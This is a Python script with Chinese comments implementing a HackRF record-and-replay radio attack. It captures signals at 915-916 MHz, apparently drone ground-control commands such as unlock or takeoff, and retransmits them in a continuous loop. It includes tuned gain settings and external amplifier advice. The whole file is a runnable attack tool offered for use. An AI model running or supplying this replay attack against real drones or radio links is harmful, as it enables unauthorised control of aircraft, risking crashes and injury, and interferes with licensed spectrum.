import subprocess
import time
import os
import sys
import shutil

class HackRFReplayAttacker:
    """
    使用 HackRF 執行錄製-重放攻擊的類別。
    封裝了參數設定和 RX/TX 的執行邏輯。
    """
    def __init__(self, max_freq, min_freq, sample_rate, rx_gain, tx_gain, duration, tx_count, filename):
        # 參數初始化 (Attributes)
        self.MAX_FREQ = str(max_freq)
        self.MIN_FREQ = str(min_freq)
        self.FREQ = str((int(self.MAX_FREQ) + int(self.MIN_FREQ)) // 2)
        self.SAMPLE_RATE = str(sample_rate)
        self.RX_GAIN = str(rx_gain)
        self.TX_GAIN = str(tx_gain)
        self.DURATION = str(duration)
        self.TX_COUNT = int(tx_count)
        self.FILENAME = filename

        # 檢查 hackrf_transfer 是否存在
        # 使用 shutil.which() 在系統 PATH 中查找指令
        if shutil.which("hackrf_transfer") is None:
             print("[FATAL ERROR] 找不到 'hackrf_transfer'。請確認 HackRF Tools 已安裝並在系統 PATH 中。")
             sys.exit(1)

        # 確保輸出檔案存在
        if not os.path.exists(self.FILENAME):
            open(self.FILENAME, 'a').close()
            
        print("="*40)
        print(f"[*] HackRF Replay Attacker 啟動:")
        # 注意這裡使用 self.FREQ
        print(f"[*] Freq: {float(self.FREQ)/1e6} MHz (中心) | BW: {float(self.SAMPLE_RATE)/1e6} MHz")
        print(f"[*] RX 增益: {self.RX_GAIN} | TX 增益: {self.TX_GAIN} (請搭配外部 PA 調整)")
        print("="*40)


    def _build_command(self, mode):
        """建構 HackRF 的指令列表"""
        # 基礎指令: hackrf_transfer -f [FREQ] -s [SR] -a 1 (天線供電)
        base_cmd = ["hackrf_transfer", "-f", self.FREQ, "-s", self.SAMPLE_RATE, "-a", "1"]

        if mode == "rx":
            # -r: 錄製到檔案 | -l: LNA 增益 (接收)
            # 使用 timeout 確保指令在設定時長後停止 (Linux/macOS)
            cmd = ["timeout", self.DURATION] + base_cmd + ["-r", self.FILENAME, "-l", self.RX_GAIN]
            print(f"[*] RX: 錄製 {self.DURATION} 秒 (錄製 GCS 指令)...")
        elif mode == "tx":
            # -t: 從檔案發射 | -x: VGA 增益 (發射)
            cmd = base_cmd + ["-t", self.FILENAME, "-x", self.TX_GAIN]
            print("[*] TX: 正在重放捕捉的數據...")
        else:
            raise ValueError("指定的模式無效。請使用 'rx' 或 'tx'。")
        
        return cmd

    def _run_command(self, mode):
        """執行 HackRF 指令並處理錯誤"""
        try:
            cmd = self._build_command(mode)
            process = subprocess.run(cmd, check=False, capture_output=True)
            
            # 處理非零返回碼，允許 timeout 結束 (返回碼 124)
            if process.returncode != 0 and mode == "rx" and "No samples received" not in process.stderr.decode():
                 if process.returncode != 124:
                    print(f"[!] {mode.upper()} 執行錯誤 (Code: {process.returncode}):\n{process.stderr.decode()}")
        
        except FileNotFoundError:
            # 即使在檢查了 PATH 之後，仍保留此錯誤處理
            print("[FATAL ERROR] 找不到 'hackrf_transfer'。請確認 HackRF Tools 已安裝並在系統路徑中。")
            sys.exit(1)

    def cleanup_hackrf(self):
            """嘗試終止所有與 hackrf_transfer 相關的程序。
            確保在程式退出時關閉發射器。
            """
            print("\n[--- CLEANUP ---] 正在嘗試終止所有 HackRF 相關程序...")
            try:
                # 適用於 Linux/macOS: 使用 pkill 終止所有 hackrf_transfer 進程
                # 注意: 這會終止系統上所有用戶運行的 hackrf_transfer
                subprocess.run(["pkill", "-f", "hackrf_transfer"], check=False, capture_output=True)
                print("[V] HackRF 傳輸進程已終止。")
            except FileNotFoundError:
                # pkill 可能不存在 (例如某些精簡版環境)
                print("[!] 無法使用 pkill 終止進程。請手動檢查 HackRF 是否停止發射。")
                pass
            except Exception as e:
                print(f"[!] 清理過程中發生錯誤: {e}")
                pass


    def run_attack_cycle(self):
        """執行 RX-TX 主迴圈"""
        print("\n--- 開始自動化重放攻擊迴圈 ---")

        # try:
        #     # 步驟 1: 執行接收 (RX)
        #     print("\n"+"-"*20)
        #     print("請在 GCS 上發送指令（例如：解鎖或起飛）！")
        #     self._run_command("rx")
        # except:
        #     pass
        # finally:
        #     self.cleanup_hackrf()
        
        while True:
            try:
                
                # 步驟 2: 執行發射 (TX)
                print("-"*20)
                # 迴圈發射捕捉到的訊包
                for i in range(self.TX_COUNT):
                    print(f"重放嘗試 {i+1}/{self.TX_COUNT}...")
                    self._run_command("tx")
                
                print(f"[V] 迴圈完成。等待 2 秒後進行下一輪捕捉...")
                time.sleep(2) # 等待 2 秒

            except KeyboardInterrupt:
                print("\n[!] 測試被使用者中斷。退出程式。")
                break
            
            finally:
                self.cleanup_hackrf()

# =======================================================
# --- 運行區塊 ---
# =======================================================

if __name__ == "__main__":
    
    # 參數設定區塊 (已調整為您要求的 915M~916M 範圍)
    ATTACK_PARAMS = {
        "max_freq": 916000000,     # 最大頻率: 916 MHz
        "min_freq": 915000000,     # 最小頻率: 915
        # # 中心頻率: (915M + 916M) / 2 = 915.5 MHz
        # "freq": 915500000,          
        # 取樣率: 3 MS/s 覆蓋範圍為 914.5M ~ 916.5M
        "sample_rate": 3000000,     
        "rx_gain": 30,              # 接收 LNA 增益 (最大 40)
        "tx_gain": 47,              # 發射 VGA 增益 (請根據 PA 安全調整!)
        "duration": 30,              # 每次捕捉時長 (秒)
        "tx_count": 5,              # 每次捕捉後重放次數
        "filename": "hackrf_capture.bin"
    }

    # *** 注意：TX_GAIN 調整區 ***
    # 
    # - 若您使用 RF3809 (13dB 增益，輸入安全)，TX_GAIN=47 是安全的。
    # - 若您使用高增益 PA (如 38dB 增益，輸入上限 -8dBm)，則 TX_GAIN 必須大幅調低 (例如設為 0)！
    # 
    # ---------------------------
    
    attacker = HackRFReplayAttacker(**ATTACK_PARAMS)
    attacker.run_attack_cycle()